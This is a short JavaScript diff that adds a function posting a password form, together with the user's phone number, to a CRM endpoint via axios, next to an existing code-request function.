@@ -42,3 +42,15 @@ export async function submitCodeRequest(userPhone) {
     },
   });
 }
+
+export async function submitPassword(UserPhoneRes) {
+  const form = document.getElementById("Instruments_form_password");
+  const formData = new FormData(form);
+  formData.append("phone", UserPhoneRes);
+  await axios.post(`${crmEndpoint}/submit_code`, formData, {
+    headers: {
+      "Content-Type": "application/json",
+      Accept: "application/json",
+    },
+  });
+}
